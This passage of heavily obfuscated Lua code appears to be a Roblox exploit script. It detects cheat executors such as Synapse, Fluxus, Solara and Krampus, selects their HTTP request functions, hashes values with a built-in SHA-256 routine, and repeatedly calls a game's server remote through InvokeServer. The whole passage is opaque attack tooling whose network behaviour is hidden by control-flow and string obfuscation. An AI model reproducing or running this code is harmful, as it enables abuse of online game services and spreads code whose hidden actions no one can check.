n[0xd1],n[0b11010010],n[0xd3],n[0xd4],n[0xd5],n[0b11010110],n[0b11010111],n[0b11011000],n[0b11011001],n[0xda],n[0xdb],n[0xdc],n[0xdd],n[0b11011110],n[0b11011111],n[0xe0]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h e,d,o,C,j,h,k,a,r,m,l,z,y,t,D,x=0x11,0b11011001,0x9b,0xf8,0b10000111,0b11011111,0b10011000,0b101000,0b11100001,0x55,0xce,0x69,0b11110,0xe9,0b10001110,0x94 n[0xe1],n[0xe2],n[0xe3],n[0xe4],n[0b11100101],n[0b11100110],n[0xe7],n[0b11101000],n[0b11101001],n[0xea],n[0xeb],n[0xec],n[0b11101101],n[0b11101110],n[0xef],n[0xf0]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h r,a,z,x,k,D,l,y,j,o,h,e,C,m,t,d=0x8c,0b10111011,0xbf,0b1101000,0x89,0b1000010,0xb0,0x99,0b101101,0b1000001,0x16,0b1101,0b10100001,0b1010100,0b1111,0xe6 n[0b11110001],n[0b11110010],n[0b11110011],n[0b11110100],n[0xf5],n[0xf6],n[0xf7],n[0b11111000],n[0b11111001],n[0b11111010],n[0b11111011],n[0xfc],n[0xfd],n[0b11111110],n[0b11111111],n[0b100000000]=r,C,k,e,z,d,D,x,o,y,j,t,l,m,a,h s=n s={[1]=0b10,[0b10]=s}s[0b11]=s k,r,n,e,C=w:N(),w:M(),w:L{s},w:K{s},w:J()d,z=v,e z=z(d)D,x,d,o=1,#i,"",0b10000 B=(x~=x or o>0 and D>x or(o<=0 or o~=o)and D<x)and(w.ka[0x18ff]or w:na(0x1717,0x1640,0x18ff))or w.ka[0x51fb]or w:na(0x334b,0x3328,0x51fb)end elseif B<0b11011011 then if B<=0b11001011 then t=t+m B=(m>0 and t>l or m<=0 and t<l or m~=m)and(w.ka[-0b110110100]or w:na(0x6b03,0x6ad2,-0x1b4))or B+0b100111 else return d end elseif B<=0b11011011 then t=t+m B=(m>0 and t>l or m<=0 and t<l or m~=m)and(w.ka[0x2397]or w:ma(0x2d726,0x2da,0x2397))or w.ka[0x5564]or w:ma(0x200f80,0x7a80,0x5564)else h=string h,a=y[t],h[w.ka[-0xb85]or w:la(w.V"8ao&v",w.V"Q+W",-0xb85)]B,a=w.ka[-0x2f1d]or w:na(0x5181,0x50b6,-0x2f1d),a(h)d=d..a end elseif B>0xbc then if B<=0xc0 then a=1 c,h,m,a=D+j,i,j+a,i.byte a=a(h,c)B=a and(w.ka[0x3a40]or w:ma(0x137ad2,0x3fef,0x3a40))or 0x5400/B else l,t,m=y,k,j t(l,m)l,t=0x10,1 m=t B=(l~=l or m>0 and t>l or(m<=0 or m~=m)and t<l)and(w.ka[-0b110110100]or w:na(0x6062,0x6031,-0x1b4))or B+0x2f end elseif B>=0xa6 then if B<=0b10100110 then _=0b10000 b=t*_ g=b+a B,u=0x26e8/B,z[g]j[a]=u else t=t+m B=(m>0 and t>l or m<=0 and t<l or m~=m)and B+-0b10101011 or 0x5a54/B end elseif B<=0b10000111 then B,c,a,h=w.ka[0x1c39]or w:na(0x802c,0x7f70,0x1c39),j,k,y a(h,c)else B,c=w.ka[0x4d0e]or w:ma(0x108b12,0x6f73,0x4d0e),0xe0 h=c+t a=z[h]j[t]=a end elseif B<=0x3c then if B<0x2c then if B>=0b100011 then if B<=0b100011 then j={}l,t,j,y=1,0b1111,0,j B=(t~=t or l>0 and j>t or(l<=0 or l~=l)and j<t)and B+0b1001 or w.ka[-0x438]or w:ma(0xf5dc0,0x147d,-0x438)else t=t+m B=(m>0 and t>l or m<=0 and t<l or m~=m)and 0x1cf2/B or 0x179a/B end else t,l=n,y t(l)l,t=y,r t(l)l,t=0b10000,1 m=t B=(l~=l or m>0 and t>l or(m<=0 or m~=m)and t<l)and(w.ka[-0x369f]or w:ma(0x19efe7,0x220d,-0x369f))or w.ka[-0x3d70]or w:na(0x380e,0x376f,-0x3d70)end elseif B>0x31 then a=a+c B=(c>0 and a>h or c<=0 and a<h or c~=c)and 0x1fa4/B or 0b11100010-B elseif B<=0x2c then t={}j,t,l=t,1,0x10 m=t B=(l~=l or m>0 and t>l or(m<=0 or m~=m)and t<l)and 0b100101011-B or 0x6f-B else D=D+o B=(o>0 and D>x or o<=0 and D<x or o~=o)and B+0xa6 or w.ka[0x51fb]or w:na(0xbe1,0xbbe,0x51fb)end elseif B>0x59 then if B>0x70 then h,a=y,n a(h)h,a=y,r a(h)h,a=y,C a(h)h,a=0x10,1 c=a B=(h~=h or c>0 and a>h or(c<=0 or c~=c)and a<h)and 0x102-B or 0x4fc2/B else B,a=w.ka[0x3a40]or w:na(0x26c7,0x2679,0x3a40),0 end elseif B<=0b1001110 then if B<=0b1000011 then B,a=w.ka[-0x10cc]or w:na(0x4008,0x3f2d,-0x10cc),z[t]j[t]=a else B,y[m]=w.ka[-0x6c9e]or w:ma(0x141ab4,0x39d4,-0x6c9e),a end else j=j+l B=(l>0 and j>t or l<=0 and j<t or l~=l)and B+-0b101101 or 0x42c0/B end end end end,h=function(h,b)return function(i,a,f)local c,e,j,g,_,l,n,d,k _=h.ka[0x703f]or h:ma(0x2cc112,0x46b9,0x703f)while true do if _>=0b10110001 then if _>0b10110001 then c,e,k,j=l,#i,1,l.sub j=j(c,k,e)c,l,j=i,j,b[1][0b11][b[1][1]]k=l j=h.c(j(c,k))return h.d(j)else g,d,e=tostring,j,sha256 g=g(d)_,g=h.ka[0b110111001]or h:na(0x1bc9,0x1b47,0b110111001),n..g e=e(g)l=l..e end elseif _>0b10000010 then n,k,j,c,l=a..f,0x40,1,#i,""_=(c~=c or k>0 and j>c or(k<=0 or k~=k)and j<c)and(h.ka[0x7c6c]or h:na(0x3f17,0x3e29,0x7c6c))or h.ka[-0x4745]or h:ma(0x5800c8,0x7f48,-0x4745)else j=j+k _=(k>0 and j>c or k<=0 and j<c or k~=k)and(h.ka[0x7c6c]or h:na(0b100100101,0x37,0x7c6c))or h.ka[-0x4745]or h:ma(0x275ea1,0x38f1,-0x4745)end end end end,i=function(e,b)return function(c)local f,g,_,a _=e.ka[-0x79f6]or e:na(0x4e18,0x4d3b,-0x79f6)repeat if _>=0b11010111 then if _>0b11010111 then f=table g,f,a=c[e.ka[0x4e23]or e:la(e.V"vH6ny",e.V"nEw",0x4e23)],b[1][0b11][b[1][1]],f[e.ka[0x5596]or e:la(e.V"15yiL",e.V"J7o",0x5596)]a=a(f,g)_=a and(e.ka[0x18ff]or e:ma(0x22c077,0x2961,0x18ff))or e.ka[-0x5b5c]or e:oa(0b111110,0x3e2c,-0x5b5c)else f,a=1,wait _=_+-0b1011101 a(f)a,f=b[0b10][0b11][b[0b10][1]],c[e.ka[0x4e23]or e:la(e.V"K@VaJ",e.V"ZVv",0x4e23)]a(f)end else return end until false end end,E=function(h,b)return function(i)local f,g,c,j,n,d,l,e,a,k,_ _=h.ka[-0x4eb8]or h:na(0x5c29,0x5b51,-0x4eb8)repeat if _>0b10101001 then if _<0b11011000 then if _<=0b10111111 then f,a,j=ipairs,0,b[0b1000][0b11][b[0b1000][1]]j=j()l=j f,l,n=f(l)f,l,n=h.b(f,l,n)j,c=f(l,n)n=j _=n==nil and(h.ka[0x82b]or h:ma(0x7af03,0x1e43,0x82b))or h.ka[-0x73aa]or h:na(0x7a3d,0x7a0e,-0x73aa)else e=task k=e[h.ka[0x25ae]or h:la(h.V"IUXkq",h.V"e@*",0x25ae)]_=0x1299/_ k()end elseif _>=0b11011011 then if _>0xdb then _,f=h.ka[0x1997]or h:na(0x50d,0x464,0x1997),task a=f[h.ka[0x25ae]or h:la(h.V"!wB6S",h.V"X|w",0x25ae)]a()else a=b[0b10][0b11][b[0b10][1]]a=a()_=a and(h.ka[0x5384]or h:ma(0xcb13d,0x1103,0x5384))or h.ka[0x1997]or h:ma(0x18b842,0x2572,0x1997)end else a=b[0b110][0b11][b[0b110][1]]a()a=b[0b10][0b11][b[0b10][1]]a=a()_=a and(h.ka[-0x229f]or h:ma(0x15194d,0x368f,-0x229f))or h.ka[0x5280]or h:ma(0x5d1279,0x5e2d,0x5280)end elseif _>=0b1100011 then if _<0x7a then _,a=0x160-_,b[0b100][0b11][b[0b100][1]]a()elseif _>0b1111010 then f,a=i,b[1][0b11][b[1][1]]_=_+0b110010 a(f)f=task f,a=0.3,f[h.ka[0x25ae]or h:la(h.V"UkE`R",h.V"X(#",0x25ae)]a(f)else k=b[0b11][0b11][b[0b11][1]]_=h.ka[0x82b]or h:ma(0xd49d6,0x3456,0x82b)k()e=task e,k=0b10,e[h.ka[0x25ae]or h:la(h.V"<&OKC",h.V"?~(",0x25ae)]k(e)k=b[0b111][0b11][b[0b111][1]]k()end elseif _>=0x2f then if _<=0b101111 then k,g=b[0b101][0b11][b[0b101][1]],h.ka[0x5706]or h:la(h.V"IUl;v1rZo|L`$Wk4?W!Q5*;XieqQT_4g",h.V";)*OP5PWcVgq2xq",0x5706)k,e=k.WaitForChild,k k=k(e,g)k,g,e,d=k.InvokeServer,c[h.ka[0x4922]or h:la(h.V"-E`k;%>",h.V"7`^",0x4922)],k,c[h.ka[-0x824]or h:la(h.V"bZBJ",h.V"0R",-0x824)]k(e,g,d)k=1 a,k=a+k,0b110010 _=a>k and(h.ka[-0x5b5c]or h:na(0x1167,0x10ed,-0x5b5c))or h.ka[-0xaa6]or h:ma(0xb4ec4,0xdfc,-0xaa6)else return end else j,c=f(l,n)n=j _=n==nil and 0x5d7/_ or h.ka[-0x73aa]or h:ma(0x477f9,0x1857,-0x73aa)end until false end end,X=function(h,b)return function(i)local n,a,f,c,g,d,e,j,_,m,p,k,l _=0b11110100 repeat if _<=0x41 then if _<0b111000 then j,n,f,l=0x18,a,b[0b11][0b11][b[0b11][1]],b[0b10][0b11][b[0b10][1]]l=l(n,j)j,p,k,n=b[0b10][0b11][b[0b10][1]],a,0b10000,b[1][0b11][b[1][1]]j=j(p,k)p=0b11111111 n=n(j,p)k,e,j,p=a,0b1000,b[1][0b11][b[1][1]],b[0b10][0b11][b[0b10][1]]p=p(k,e)k=0xff j=j(p,k)p,k,e=b[1][0b11][b[1][1]],a,0xff p=h.c(p(k,e))f=h.c(f(l,n,j,h.d(p)))return h.d(f)elseif _>0x38 then f=f+n _=(n>0 and f>l or n<=0 and f<l or n~=n)and 0x28a/_ or _+-0b1001 else k=0x55 d,p,m,k,c,g=i,a*k,f,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~",f,i.sub g=g(d,m,c)m,d,e,k=true,1,k,k.find _,k=0b1000001,k(e,g,d,m)j,p=p+k,1 a=j-p end else l,f,a=0b101,1,0 n=f _=(l~=l or n>0 and f>l or(n<=0 or n~=n)and f<l)and 0b1010 or 0b111000 end until false end end,r=function(h)return function(c)local g,d,a,f d,a,f,g=h:F(),c.gsub,c,"."a=h.c(a(f,g,d))return h.d(a)end end,y=function(w)return function()local e,x,s,a,_,t,q,k,g,r,v,p,j,l,n,f,d,y,m,h,o,i _=w.ka[-0x7c22]or w:na(0x57ac,0x5797,-0x7c22)while true do if _<=0x4e then if _<0b11100 then if _>=0x15 then if _<=0b10101 then s,v,r,n={},{},w.ka[-0x63]or w:la(w.V"#{uv42=eg",w.V"fq0Y",-0x63),syn s[1],s[0b10]=n,r f,r,n,p=s,http,{},w.ka[-0x2527]or w:la(w.V"fI6rvr2",w.V"U&H",-0x2527)n[1],n[0b10]=r,p k,s,r,p=w.ka[0x264c]or w:la(w.V"UL}!WJeL",w.V"<VhF",0x264c),n,{},fluxus r[1],r[0b10]=p,k n,k,e,p=r,delta,w.ka[-0x2527]or w:la(w.V"(Wm*g^Z",w.V"!j%",-0x2527),{}p[1],p[0b10]=k,e k,r,g,e={},p,w.ka[0x3640]or w:la(w.V"MewsjbndxM",w.V"Al94!",0x3640),electron k[1],k[0b10]=e,g p,d,e,g=k,w.ka[0x42a0]or w:la(w.V"0+uD5IR",w.V"`9S",0x42a0),{},codex e[1],e[0b10]=g,d q,d,k,g=w.ka[0x5d7e]or w:la(w.V"E}QWNhUN",w.V"h~r@",0x5d7e),oxygen,e,{}g[1],g[0b10]=d,q q,d,x,e=arceus,{},w.ka[0x6db4]or w:la(w.V"*0#9vv8V",w.V"+r*a",0x6db4),g d[1],d[0b10]=q,x o,q,x,g=w.ka[-0x457a]or w:la(w.V"(E$4x",w.V"c9Z",-0x457a),{},evon,d q[1],q[0b10]=x,o d,y,o,x=q,w.ka[-0x66d1]or w:la(w.V"KM<=74Xg",w.V"!eVO",-0x66d1),trigon,{}x[1],x[0b10]=o,y o,q,y,j={},x,xen,w.ka[0x496]or w:la(w.V"NOgV",w.V"5C",0x496)o[1],o[0b10]=y,j j,x,y,t=krypton,o,{},w.ka[-0x6538]or w:la(w.V"loUL#5-PC",w.V"MP}a",-0x6538)y[1],y[0b10]=j,t l,j,t,o=w.ka[0x30a]or w:la(w.V"$m{9v",w.V"ik|",0x30a),{},wave,y j[1],j[0b10]=t,l t,l,m,y={},cryptic,w.ka[-0x76ee]or w:la(w.V"N_L=maIk6",w.V"*#rp",-0x76ee),j t[1],t[0b10]=l,m a,m,j,l=w.ka[0x21a3]or w:la(w.V"5o;@VGy",w.V"4o3",0x21a3),velys,t,{}l[1],l[0b10]=m,a a,h,m,t=hydrogen,w.ka[-0x4448]or w:la(w.V"uLbWZh#T%T",w.V"TZ??>",-0x4448),{},l m[1],m[0b10]=a,h l=m v[1],v[0b10],v[0b11],v[0b100],v[0b101],v[0b110],v[0b111],v[0b1000],v[0b1001],v[0b1010],v[0b1011],v[0b1100],v[0b1101],v[0b1110],v[0b1111],v[0x10]=f,s,n,r,p,k,e,g,d,q,x,o,y,j,t,l n,r,s=macsploit,w.ka[0x1410]or w:la(w.V"FUqrs634%?76",w.V"+t90G",0x1410),{}s[1],s[0b10]=n,r r,f,n,p=headless,s,{},w.ka[-0x2632]or w:la(w.V"t?7TjiRo?E",w.V"q#lgr",-0x2632)n[1],n[0b10]=r,p r,k,p,s={},w.ka[-0x41fe]or w:la(w.V"Th;|>%Lo",w.V"X}Jg",-0x41fe),solara,n r[1],r[0b10]=p,k k,p,e,n=vega,{},w.ka[0x37ce]or w:la(w.V"?)l&S",w.V"oVW",0x37ce),r p[1],p[0b10]=k,e k,g,e,r={},w.ka[0x3584]or w:la(w.V"3tll#EC",w.V"DOd",0x3584),swift,p k[1],k[0b10]=e,g e,p,g,d={},k,jjsploit,w.ka[-0x40a9]or w:la(w.V"QXZuXbUU99",w.V"d-hZq",-0x40a9)e[1],e[0b10]=g,d k,h,a,m=e,w.ka[-0xb84]or w:la(w.V"v#)EFt$&L",w.V"3f=e",-0xb84),krampus,{}m[1],m[0b10]=a,h e=m v[0x11],v[0x12],v[0b10011],v[0b10100],v[0b10101],v[0x16],v[0x17]=f,s,n,r,p,k,e v,i=ipairs,v f=i v,f,s=v(f)v,f,s=w.b(v,f,s)n,r=v(f,s)s=n _=s==nil and(w.ka[-0x6de7]or w:na(0x36f9,0x3616,-0x6de7))or w.ka[-0x56c]or w:ma(0x500be,0x4727,-0x56c)else _=p and 0b1001011-_ or _+0b11010111 end elseif _<=0b1111 then f=getexecutorname f=f()_,v=_+0b1000101,f else p=r[1]_=p and(w.ka[0x421b]or w:ma(0x2d37f7,0x33e9,0x421b))or _+0b1000 end elseif _>0x31 then f,v=getexecutorname,w.ka[0x6415]or w:la(w.V";eg=Uf&AJ",w.V"i|(`",0x6415)_=f and 0b1011101-_ or 0b100100101-_ elseif _>0x22 then e=r[1]p,k=e[w.ka[-0xc35]or w:la(w.V"cxCo~W%Pa",w.V"hX4u",-0xc35)],r[0b10]return p,k elseif _<=0x1c then v=request _=v and(w.ka[0x69d1]or w:ma(0x12b3a,0x8cd,0x69d1))or 0x6a-_ else f,v=w.ka[-0x2825]or w:la(w.V"uDPu",w.V"+y",-0x2825),request return v,f end elseif _>0b11010111 then if _>=0xe3 then if _<=0xe3 then v=http_request _=v and 0x4fce/_ or 0x18d4/_ else n,r=v(f,s)s=n _=s==nil and 0xd5b3/_ or w.ka[-0x56c]or w:ma(0xe68e,0xccf,-0x56c)end else k=r[1]_,p=_+-0xc5,k[w.ka[-0xc35]or w:la(w.V"-Gw9Cg(2G",w.V"QsA!",-0xc35)]end elseif _<=0b10101110 then if _<0b1011010 then s,f=v,nil return f,s elseif _>0x5a then _,f=w.ka[0x2f3d]or w:ma(0xd76a0,0x2908,0x2f3d),identifyexecutor f=f()v=f else v,f=http_request,w.ka[0xe73]or w:la(w.V"E-o@E",w.V"T1E",0xe73)return v,f end else f=identifyexecutor _=f and _+-0b101001 or w.ka[0x2f3d]or w:ma(0x1f863c,0x6013,0x2f3d)end end end end,z=function(w)return function(i)local _,t,M,r,J,z,K,D,l,H,m,e,s,d,c,a,v,F,q,L,p,y,C,I,b,E,x,G,h,g,u,o,j,B,f B=w.ka[-0x9fc]or w:ma(0x5688a8,0x5dde,-0x9fc)while true do if B>0b10010000 then if B>0b11001101 then if B<0xec then M=M+z B=(z>0 and M>e or z<=0 and M<e or z~=z)and 0xf3-B or w.ka[0x15c4]or w:ma(0x80126,0x421a,0x15c4)elseif B<=0b11101100 then K,z,r,v,l,e,j,F,s,C,a,y,L,d,J,m,o,M=3624381080,0x59f111f1,0x71374491,w:I(),2162078206,0x3956c25b,0x550c7dc3,0x72be5d74,{},3049323471,3248222580,0x243185be,0x428a2f98,2453635748,2870763221,2614888103,0x12835b01,3921009573 s[1],s[0b10],s[0b11],s[0b100],s[0b101],s[0b110],s[0b111],s[0b1000],s[0b1001],s[0b1010],s[0b1011],s[0b1100],s[0b1101],s[0b1110],s[0b1111],s[0x10]=L,r,C,M,e,z,d,J,K,o,y,j,F,l,m,a z,d,J,L,j,r,y,F,K,l,C,a,M,o,m,e=0x4a7484aa,0x5cb0a9dc,0x76f988da,3835390401,3210313671,4022224774,2952996808,3336571891,2554220882,3584528711,0xfc19dc6,0x14292967,0x240ca1cc,2821834349,0x6ca6351,0x2de92c6f s[0b10001],s[0x12],s[0x13],s[0b10100],s[0x15],s[0x16],s[0x17],s[0b11000],s[0b11001],s[0b11010],s[0b11011],s[0b11100],s[0b11101],s[0x1e],s[0x1f],s[0x20]=L,r,C,M,e,z,d,J,K,o,y,j,F,l,m,a m,M,d,j,y,L,a,o,C,z,F,l,K,J,r,e=4094571909,0x53380d13,2177026350,3345764771,3259730800,0x27b70a85,0x106aa070,2820302411,0x4d2c6dfc,0x766a0abb,3516065817,3600352804,2730485921,2456956037,0x2e1b2138,0x650a7354 s[0b100001],s[0b100010],s[0b100011],s[0b100100],s[0x25],s[0x26],s[0b100111],s[0x28],s[0x29],s[0x2a],s[0x2b],s[0b101100],s[0x2d],s[0x2e],s[0x2f],s[0b110000]=L,r,C,M,e,z,d,J,K,o,y,j,F,l,m,a j,C,K,z,o,d,a,e,F,l,r,M,L,m,J,y=2361852424,0x2748774c,0x748f82ee,0x4ed8aa4a,0x78a5636f,0x5b9cca4f,3329325298,0x391c0cb3,2428436474,2756734187,0x1e376c08,0x34b0bcb5,0x19a4c116,3204031479,0x682e6ff3,2227730452 s[0b110001],s[0b110010],s[0x33],s[0x34],s[0b110101],s[0b110110],s[0b110111],s[0b111000],s[0b111001],s[0x3a],s[0x3b],s[0x3c],s[0b111101],s[0b111110],s[0b111111],s[0b1000000]=L,r,C,M,e,z,d,J,K,o,y,j,F,l,m,a s,H=w:H(),s r,L=i,s L=L(r)z,e,d,J,y,K,o,M,C=0x3c6ef372,3144134277,2773480762,0x510e527f,0x5be0cd19,2600822924,0x1f83d9ab,0x6a09e667,{}C[1],C[0b10],C[0b11],C[0b100],C[0b101],C[0b110],C[0b111],C[0b1000]=M,e,z,d,J,K,o,y M,r,C,e=#L,C,1,0b1000000 B=(M~=M or e>0 and C>M or(e<=0 or e~=e)and C<M)and(w.ka[-0x463e]or w:na(0xb36,0xaad,-0x463e))or w.ka[-0x56c]or w:ma(0x6e97c,0x624e,-0x56c)else m=m+h B=(h>0 and m>a or h<=0 and m<a or h~=h)and(w.ka[-0x329b]or w:ma(0x287ca8,0x63a9,-0x329b))or B+-0x2b end elseif B>0xba then if B<=0xc9 then I=bit32 b,g,I,c=0b110,y,v,I[w.ka[-0x5f65]or w:la(w.V"TJ%@`",w.V"j5q",-0x5f65)]I=I(g,b)g,b,_=v,y,0b1011 g=g(b,_)_,p,b=y,0x19,v b=w.c(b(_,p))c=c(I,g,w.d(b))g=bit32 b,I=g,g[w.ka[-0x5f65]or w:la(w.V"V76_%",w.V"&H?",-0x5f65)]b,g,_=y,b[w.ka[-0xc47]or w:la(w.V"Kn6?$",w.V"XCe",-0xc47)],j g=g(b,_)_=bit32 b,p=_[w.ka[-0xc47]or w:la(w.V"Ogcb6",w.V"TP^",-0xc47)],_ p,_=y,p[w.ka[0x4bb0]or w:la(w.V"6A&H>",w.V"esK",0x4bb0)]_=_(p)p=F b=w.c(b(_,p))I=I(g,w.d(b))B,b=w.ka[-0x3add]or w:na(0x1c53,0x1b5f,-0x3add),bit32 q,g=l+c,b[w.ka[-0xc47]or w:la(w.V"1``Sv",w.V"a%2",-0xc47)]p,t=q+I,1 E=m+t q=H[E]p,_=z[m],p+q b,_=_+p,4294967295 g=g(b,_)_=bit32 _,b,p,q=v,_[w.ka[-0x5f65]or w:la(w.V"xT>|F",w.V"(%J",-0x5f65)],d,0b10 _=_(p,q)E,q,p=0b1101,d,v p=p(q,E)t,E,q=0b10110,d,v q=w.c(q(E,t))b=b(_,p,w.d(q))p=bit32 q,_=p,p[w.ka[-0x5f65]or w:la(w.V"oKulm",w.V"EB*",-0x5f65)]E,q,p=J,d,q[w.ka[-0xc47]or w:la(w.V"{r~a$",w.V"o}T",-0xc47)]p=p(q,E)E=bit32 t,E,q=K,d,E[w.ka[-0xc47]or w:la(w.V"eZ6tG",w.V"+#d",-0xc47)]q=q(E,t)t=bit32 t,D,E=J,K,t[w.ka[-0xc47]or w:la(w.V"+i=%)",w.V"5xD",-0xc47)]E=w.c(E(t,D))_=_(p,q,w.d(E))q=bit32 q,E,p=b+_,4294967295,q[w.ka[-0xc47]or w:la(w.V"lh2>Z",w.V"uJH",-0xc47)]p=p(q,E)j,E,l,F=y,bit32,F,j t,q,E=4294967295,E[w.ka[-0xc47]or w:la(w.V"CGIKf",w.V"k4F",-0xc47)],o+g q=q(E,t)E,K,y,o,J=bit32,J,q,K,d q,t,E=E[w.ka[-0xc47]or w:la(w.V"_-piT",w.V"3Yq",-0xc47)],4294967295,g+p q=q(E,t)d=q else I=bit32 q,u,G,g,f,p,c,x,B,E,D,t=d,j,F,r[m],y,{},I[w.ka[-0xc47]or w:la(w.V"zjw28",w.V"7To",-0xc47)],l,B+-0b10110,J,o,K p[1],p[0b10],p[0b11],p[0b100],p[0b101],p[0b110],p[0b111],p[0b1000]=q,E,t,D,f,u,G,x _=p b=_[m]g,I=4294967295,g+b c=c(I,g)r[m]=c end elseif B>0xb7 then K,d,J=1,0b10000,0b111111 B=(J~=J or K>0 and d>J or(K<=0 or K~=K)and d<J)and 0x165-B or 0b100101011-B elseif B>0xab then m=m+h B=(h>0 and m>a or h<=0 and m<a or h~=h)and(w.ka[0x5e31]or w:na(0xbef,0xbd1,0x5e31))or 0x928b/B else J,d=r,unpack d,J,K,o,y,j,F,l=d(J)a,m,h=0x3f,0,1 B=(a~=a or h>0 and m>a or(h<=0 or h~=h)and m<a)and 0x113-B or w.ka[-0xb9e]or w:ma(0x27c38d,0x32a5,-0xb9e)end elseif B>=0b1101000 then if B<0b1110001 then if B>0x68 then d=d+K B=(K>0 and d>J or K<=0 and d<J or K~=K)and B+0x3e or w.ka[0x17b]or w:ma(0x194c50,0x3950,0x17b)else a,m=0b1000,1 h=m B=(a~=a or h>0 and m>a or(h<=0 or h~=h)and m<a)and(w.ka[0x5e31]or w:ma(0xc5c6a,0x697b,0x5e31))or w.ka[0x1ae3]or w:ma(0x2e2ebc,0x39ac,0x1ae3)end elseif B<0x89 then y=bit32 o,l,y=y[w.ka[-0x5f65]or w:la(w.V"5HuY=",w.V"OmY",-0x5f65)],0b1111,v F=d-l j,F=z[F],0b111 y=y(j,F)m,j=0b1111,v l=d-m F,l=z[l],0b10010 j=j(F,l)l=bit32 a,F=0b1111,l[w.ka[0x73d1]or w:la(w.V"H{=2=@g4",w.V"YL`U",0x73d1)]m=d-a m,l=0b11,z[m]F=w.c(F(l,m))o=o(y,j,w.d(F))j=bit32 j,m,y=v,0b10,j[w.ka[-0x5f65]or w:la(w.V"0Obwu",w.V"oni",-0x5f65)]l=d-m F,l=z[l],0b10001 j=j(F,l)F,a=v,0b10 m=d-a m,l=0x13,z[m]F=F(l,m)m=bit32 h,l=0b10,m[w.ka[0x73d1]or w:la(w.V");%4~C;<",w.V"bxx!",0x73d1)]a=d-h m,a=z[a],0b1010 l=w.c(l(m,a))y=y(j,F,w.d(l))F=bit32 j,c=F[w.ka[-0xc47]or w:la(w.V"TzOD@",w.V"7(M",-0xc47)],0b10000 h=d-c a=z[h]c,m=0b111,a+o h=d-c a=z[h]l=m+a l,F=4294967295,l+y B,j=0b11011110-B,j(F,l)z[d]=j elseif B<=0x89 then e,M,C=0b1000,1,""z=M B=(e~=e or z>0 and M>e or(z<=0 or z~=z)and M<e)and 0xc4f/B or 0xa8-B else d=d+K B=(K>0 and d>J or K<=0 and d<J or K~=K)and(w.ka[-0x7270]or w:na(0x94c,0x892,-0x7270))or w.ka[-0x1251]or w:ma(0x2ca20,0x18a0,-0x1251)end elseif B>=0b11101 then if B>=0b11110 then if B>0x1e then J=string B,K,d=0x1aa4/B,bit32,J[w.ka[-0xb85]or w:la(w.V">9Omp",w.V"*@^",-0xb85)]o,J,K=0b11000,K[w.ka[0x73d1]or w:la(w.V"QJhCgiCX",w.V"FYhA",0x73d1)],r[M]J=J(K,o)o=bit32 y,K=o,o[w.ka[-0xc47]or w:la(w.V"+zQYS",w.V"YrX",-0xc47)]y,o,j=r[M],y[w.ka[0x73d1]or w:la(w.V"=e48!puY",w.V"%f^)",0x73d1)],0b10000 o=o(y,j)y=0xff K=K(o,y)y=bit32 j,o=y,y[w.ka[-0xc47]or w:la(w.V"m{62e",w.V"G5P",-0xc47)]F,j,y=0b1000,r[M],j[w.ka[0x73d1]or w:la(w.V"DGHP_ABX",w.V"{CQg",0x73d1)]y=y(j,F)j=0b11111111 o=o(y,j)j=bit32 y,F,j=j[w.ka[-0xc47]or w:la(w.V"a5;QD",w.V"SP}",-0xc47)],0b11111111,r[M]y=w.c(y(j,F))d=d(J,K,o,w.d(y))C=C..d else C=C+e B=(e>0 and C>M or e<=0 and C<M or e~=e)and 0x100e/B or w.ka[-0x56c]or w:na(0x25c1,0x25af,-0x56c)end else j=0b100 y=d*j j,o=bit32,C+y F,y=j,j[w.ka[0x2497]or w:la(w.V">E!t",w.V"iv",0x2497)]l,F,j,m=L,L.byte,F[w.ka[-0x3c79]or w:la(w.V"aF~#Fjf?",w.V"`0E@",-0x3c79)],o F=F(l,m)l=0x18 j=j(F,l)l=bit32 a,F=1,l[w.ka[-0x3c79]or w:la(w.V"9wjmxFfI",w.V"T2^u",-0x3c79)]a,l,m=o+a,L.byte,L B,l=0x1050/B,l(m,a)m=0b10000 F=F(l,m)m=bit32 l,h=m[w.ka[-0x3c79]or w:la(w.V"dm9yg4ha",w.V"eP|Z",-0x3c79)],0b10 h,m,a=o+h,L.byte,L m=m(a,h)a=0b1000 l=l(m,a)h=0b11 h,a,m=o+h,L,L.byte m=w.c(m(a,h))y=y(j,F,l,w.d(m))z[d]=y end elseif B<=0b10010 then d={}d,z,K,J=0,d,1,0b1111 B=(J~=J or K>0 and d>J or(K<=0 or K~=K)and d<J)and(w.ka[-0x7270]or w:na(0x73f5,0x733b,-0x7270))or w.ka[-0x1251]or w:ma(0xd253f,0x740b,-0x1251)else return C end end end end,C=function(h,b)return function(i,a,f,l)local j,c,_,d,k _=h.ka[0x7c6c]or h:ma(0x5a7fd0,0x6158,0x7c6c)repeat if _>=0b10011100 then if _>0x9c then i={[1]=0b10,[0b10]=i}i[0b11]=i c,k,j,d=a,l,f,b[0b11][0b11][b[0b11][1]]d=d(j,c,k)d={[1]=0b10,[0b10]=d}d[0b11]=d j,c=pcall,h:P{d,i,b[0b10],b[1]}j,c=j(c)k=j _=k and(h.ka[0x3a40]or h:ma(0x1b47be,0x5989,0x3a40))or h.ka[-0x135d]or h:na(0x6a44,0x69a8,-0x135d)else return k end else _,k=h.ka[-0x135d]or h:ma(0xab288,0x118e,-0x135d),c end until false end end,m=function(h,b)return function(i,a)local e,c,l,f,k,j,m l=b[1][0b11][b[1][1]]m,k,f,c=a,h.ka[0x3ce7]or h:la(h.V"yRQ",h.V"%>",0x3ce7),l[h.ka[-0x37ef]or h:la(h.V"v_f1jwwG6Z8le",h.V"@mnt=@&",-0x37ef)],{}c[h.ka[0x4e23]or h:la(h.V"t<#Rz",h.V"vf}",0x4e23)]=k e,c,j=h.ka[-0x492c]or h:la(h.V"=$8",h.V"$^",-0x492c),h.ka[0x7a7e]or h:la(h.V"ZlEAaSm#U!7X",h.V"D{g`{",0x7a7e),c k=i..e c=c..k f=h.c(f(l,m,j,c))return h.d(f)end end,w=function(e,b)return function(c)local a,f,_ _=e.ka[0x2310]or e:na(0x332e,0x3250,0x2310)while true do if _>=0xde then _=e.ka[0x350d]or e:ma(0x425b86,0x6e4f,0x350d)else a,_,f=b[1][0b11][b[1][1]],e.ka[0x350d]or e:ma(0x1f2bba,0x33d1,0x350d),c a(f)f=task a,f=f[e.ka[0x25ae]or e:la(e.V"k?oK8",e.V"jOG",0x25ae)],1 a(f)end end end 